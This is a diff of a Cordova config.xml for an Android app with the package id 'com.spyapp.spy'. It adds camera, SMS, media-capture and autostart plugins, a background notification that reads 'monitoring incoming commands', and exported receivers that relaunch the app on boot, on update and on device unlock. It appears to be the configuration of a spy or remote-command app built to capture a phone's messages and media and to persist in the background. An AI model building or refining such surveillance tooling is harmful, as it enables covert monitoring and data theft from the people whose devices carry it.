@@ -1,4 +1,3 @@
-
 <?xml version='1.0' encoding='utf-8'?>
 <widget id="com.spyapp.spy" version="1.0.1"
     xmlns="http://www.w3.org/ns/widgets"
@@ -15,13 +14,14 @@
     <allow-intent href="mailto:*" />
     <allow-intent href="geo:*" />
 
+    <!-- استهداف SDK حديث -->
     <preference name="android-targetSdkVersion" value="34" />
 
-    <!-- إشعار خدمة الخلفية الواجب ظهوره -->
+    <!-- إشعار الخلفية -->
     <preference name="BackgroundModeAndroidNotificationTitle" value="التطبيق يعمل في الخلفية" />
     <preference name="BackgroundModeAndroidNotificationText" value="جارٍ مراقبة الأوامر الواردة" />
 
-    <!-- الإضافات (Plugins) -->
+    <!-- الإضافات -->
     <plugin name="cordova-plugin-camera" />
     <plugin name="cordova-plugin-sms" />
     <plugin name="cordova-plugin-media-capture" />
@@ -37,7 +37,7 @@
     <plugin name="cordova-plugin-autostart" />
 
     <platform name="android">
-        <!-- أذونات نظام Android -->
+        <!-- أذونات عامة -->
         <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest">
             <manifest xmlns:android="http://schemas.android.com/apk/res/android">
                 <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
@@ -60,25 +60,39 @@
             </manifest>
         </edit-config>
 
-        <!-- إضافة receivers مع android:exported=true لتجنب خطأ Android 12+ -->
+        <!-- receivers مع android:exported (مطلوب لـ Android 12+) -->
         <config-file file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest/application">
-            <!-- BootCompletedReceiver -->
-            <receiver android:name="com.tonikorin.cordova.plugin.autostart.BootCompletedReceiver"
-                      android:enabled="true"
-                      android:exported="true">
-                <intent-filter>
-                    <action android:name="android.intent.action.BOOT_COMPLETED" />
-                    <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
-                </intent-filter>
-            </receiver>
-            <!-- PackageReplacedReceiver -->
-            <receiver android:name="com.tonikorin.cordova.plugin.autostart.PackageReplacedReceiver"
-                      android:enabled="true"
-                      android:exported="true">
-                <intent-filter>
-                    <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
-                </intent-filter>
-            </receiver>
+            <application xmlns:android="http://schemas.android.com/apk/res/android">
+
+                <!-- BootCompletedReceiver -->
+                <receiver android:name="com.tonikorin.cordova.plugin.autostart.BootCompletedReceiver"
+                          android:enabled="true"
+                          android:exported="true">
+                    <intent-filter>
+                        <action android:name="android.intent.action.BOOT_COMPLETED" />
+                        <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                    </intent-filter>
+                </receiver>
+
+                <!-- PackageReplacedReceiver -->
+                <receiver android:name="com.tonikorin.cordova.plugin.autostart.PackageReplacedReceiver"
+                          android:enabled="true"
+                          android:exported="true">
+                    <intent-filter>
+                        <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                    </intent-filter>
+                </receiver>
+
+                <!-- UserPresentReceiver -->
+                <receiver android:name="com.tonikorin.cordova.plugin.autostart.UserPresentReceiver"
+                          android:enabled="true"
+                          android:exported="true">
+                    <intent-filter>
+                        <action android:name="android.intent.action.USER_PRESENT" />
+                    </intent-filter>
+                </receiver>
+
+            </application>
         </config-file>
     </platform>
 </widget>
